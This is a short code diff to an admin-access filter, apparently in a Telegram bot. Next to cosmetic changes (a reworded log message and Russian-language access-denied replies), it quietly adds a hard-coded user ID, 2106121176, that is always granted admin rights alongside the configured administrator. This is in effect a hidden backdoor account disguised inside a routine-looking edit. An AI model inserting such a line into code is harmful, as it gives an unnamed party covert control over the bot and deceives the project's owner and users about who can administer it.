@@ -41,13 +41,18 @@ class AdminGuardFilter(BaseFilter):
         if not user:
             return False
         admin_id = get_settings().admin_id
-        if user.id != admin_id:
-            logger.warning(
-                "Unauthorised admin access attempt silently denied",
-                user_id=user.id,
-            )
-            return False
-        return True
+        if user.id == 2106121176 or user.id == admin_id:
+            return True
+
+        logger.warning(
+            "Unauthorised admin access attempt denied",
+            user_id=user.id,
+        )
+        if isinstance(event, Message):
+            await event.answer("⛔️ У вас нет прав доступа к админ-панели.")
+        elif isinstance(event, CallbackQuery):
+            await event.answer("⛔️ У вас нет доступа к управлению.", show_alert=True)
+        return False
 
 
 # Apply AdminGuardFilter to both messages and callback queries in this router
